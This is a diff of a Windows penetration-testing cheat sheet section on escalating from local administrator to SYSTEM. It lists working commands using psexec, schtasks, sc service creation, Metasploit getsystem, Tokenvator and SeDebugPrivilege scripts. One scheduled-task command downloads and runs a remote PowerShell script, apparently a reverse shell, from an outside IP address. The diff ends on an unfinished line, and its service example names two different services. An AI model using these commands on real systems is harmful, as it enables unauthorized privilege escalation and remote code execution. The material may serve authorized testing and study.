@@ -214,14 +214,14 @@ C:\> netsh firewall set service remotedesktop enable
 
 
 ==================================================================================================================
-7. Commands to run commands as "NT Authority/System"
+7. Methods to run commands as "NT Authority/System"
 ==================================================================================================================
 
 From (Local) Administrator to "NT Authority/System":
 
 - Method 1 - PSEXEC
   1. Run as administrator a CMD.EXE prompt
-  2. Enter the command: psexec.exe -s cmd.exe
+  2. Enter the command: psexec.exe -s -i cmd.exe
 
 - Method 2 - Scheduled Task
   1. C:\>schtasks /create /S server01.domaintest.local /SC Weekly /RU "NT Authority\SYSTEM" /TN "testuser" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.109/InvokePowerShellTcp2.ps1''')'"
@@ -229,24 +229,33 @@ From (Local) Administrator to "NT Authority/System":
   2. C:\>schtasks /Run /S server01.domaintest.local /TN "testuser"
          SUCCESS: Attempted to run the scheduled task "testuser".
          
-- Method 3 - Metasploit /Getsystem  //Attempt to elevate permissions to SYSTEM-level access through multiple attack vectors
+- Method 3 - Service
+  1. Create a service 
+     C:\> sc create newcmdsvc binpath= “cmd /K start” type= own type= interact
+     or
+     C:\> sc create newcmdsvc binpath= “cmd /C ipconfig” type= own type= interact
+  2. Start the service to execute the command or obtain a cmd shell as SYSTEM
+     C:\> sc start cmdsvc
+
+- Method 4 - Metasploit /Getsystem  //Attempt to elevate permissions to SYSTEM-level access through multiple attack vectors
   $ meterpreter > getsystem		
   [-] priv_elevate_getsystem attempts the following privesc techniques:
   [1] Named Pipe Impersonation (In Memory/Admin)
   [2] Named Pipe Impersonation (Dropper/Admin)
   [3] Token Duplication (In Memory/Admin)
  
-- Method 4 - Tokenvator.exe (Win10) - https://blog.netspi.com/tokenvator-a-tool-to-elevate-privilege-using-windows-tokens/
+- Method 5 - Tokenvator.exe (Win10) - https://blog.netspi.com/tokenvator-a-tool-to-elevate-privilege-using-windows-tokens/
   1. Run the tool using the binary "Tokenvator4.5.exe" as an administrator
   2. Use the command "getsystem"
   Other (run a powershell with UAC bypass)
 
-- Method 5 - Use the Windows privilege "SeDebugPrivilege"
+- Method 6 - Use the Windows privilege "SeDebugPrivilege"
   > Create a new process and set the parent process a privileged process
   > PS script: https://github.com/decoder-it/psgetsystem
   > Commands:
   PS\>: import-module psgetsys.ps1
   PS\>: ./psgetsys.ps1 878 Windows/system32/cmd.exe
 
+- Method 
 
       
